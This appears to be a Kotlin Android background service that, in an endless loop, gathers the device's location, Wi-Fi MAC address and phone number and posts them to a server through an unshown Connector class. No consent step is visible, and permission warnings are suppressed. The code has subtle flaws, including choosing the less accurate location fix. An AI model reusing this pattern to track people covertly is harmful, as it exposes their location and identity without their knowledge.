package com.example.connector

import android.annotation.SuppressLint
import android.app.Service
import android.content.Context
import android.content.Intent
import android.location.Location
import android.location.LocationListener
import android.location.LocationManager
import android.os.Bundle
import android.os.IBinder
import android.os.Looper
import android.telephony.TelephonyManager
import com.google.gson.Gson
import org.jetbrains.anko.doAsync
import java.net.NetworkInterface
import java.util.*


class Service : Service() {
    lateinit var locationManager: LocationManager
    private var hasGps = false
    private var hasNetwork = false
    private var locationGps: Location? = null
    private var locationNetwork: Location? = null

    override fun onBind(intent: Intent): IBinder? {
        return null
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        Thread {
            getLocationService()
        }.start()
        return super.onStartCommand(intent, flags, startId)
    }

    @SuppressLint("MissingPermission")
    fun getLocationService(){
        Looper.prepare()
        while(true){
            var macAddress = getMacAddress()
            val sanitizerMac = Regex("[:]")
            macAddress = sanitizerMac.replace(macAddress, "")

            val sanitizerTel = Regex("[+]")
            val tm = getSystemService(Context.TELEPHONY_SERVICE) as TelephonyManager
            var telNumber = tm.line1Number
            telNumber = sanitizerTel.replace(telNumber, "")

            var location = getLocation()
            location.add(macAddress)
            location.add(telNumber)

            val json = Gson().toJson("")

            doAsync {
                val http = Connector()
                http.post(json, location)
            }

            Thread.sleep(1000) // 3600000
        }
        Looper.loop()
    }

    fun getMacAddress(): String {
        try {
            val all = Collections.list(NetworkInterface.getNetworkInterfaces())
            for (nif in all) {
                if (!nif.getName().equals("wlan0", ignoreCase=true)) continue

                val macBytes = nif.getHardwareAddress() ?: return ""

                val res1 = StringBuilder()
                for (b in macBytes) {
                    res1.append(String.format("%02X:", b))
                }

                if (res1.length > 0) {
                    res1.deleteCharAt(res1.length - 1)
                }
                return res1.toString()
            }
        } catch (ex: Exception) {
        }

        return "02:00:00:00:00:00"
    }

    @SuppressLint("MissingPermission")
    private fun getLocation() : ArrayList<String> {
        locationManager = getSystemService(Context.LOCATION_SERVICE) as LocationManager
        hasGps = locationManager.isProviderEnabled(LocationManager.GPS_PROVIDER)
        hasNetwork = locationManager.isProviderEnabled(LocationManager.NETWORK_PROVIDER)

        val listener = object : LocationListener {
            override fun onLocationChanged(location: Location?) {
                if (location != null) {
                    locationGps = location
                }
            }
            override fun onStatusChanged(provider: String?, status: Int, extras: Bundle?) {}
            override fun onProviderEnabled(provider: String?) {}
            override fun onProviderDisabled(provider: String?) {}

        }

        if (hasGps || hasNetwork) {
            if (hasGps) {
                locationManager.requestSingleUpdate(LocationManager.GPS_PROVIDER, listener, null)
                val localGpsLocation = locationManager.getLastKnownLocation(LocationManager.GPS_PROVIDER)
                if (localGpsLocation != null)
                    locationGps = localGpsLocation
            }
            if (hasNetwork) {
                locationManager.requestSingleUpdate(LocationManager.NETWORK_PROVIDER, listener, null)
                val localNetworkLocation = locationManager.getLastKnownLocation(LocationManager.NETWORK_PROVIDER)
                if (localNetworkLocation != null)
                    locationNetwork = localNetworkLocation
            }

            if(locationGps!= null && locationNetwork!= null){
                if(locationGps!!.accuracy > locationNetwork!!.accuracy){
                    return arrayListOf(locationGps!!.latitude.toString(), locationGps!!.longitude.toString())
                }
                return arrayListOf(locationNetwork!!.latitude.toString(), locationNetwork!!.longitude.toString())
            }

            if(locationNetwork!= null){
                return arrayListOf(locationNetwork!!.latitude.toString(), locationNetwork!!.longitude.toString())
            }
            if(locationGps!= null){
                return arrayListOf(locationGps!!.latitude.toString(), locationGps!!.longitude.toString())
            }
        }

        return arrayListOf("0.0", "0.0")
    }

}
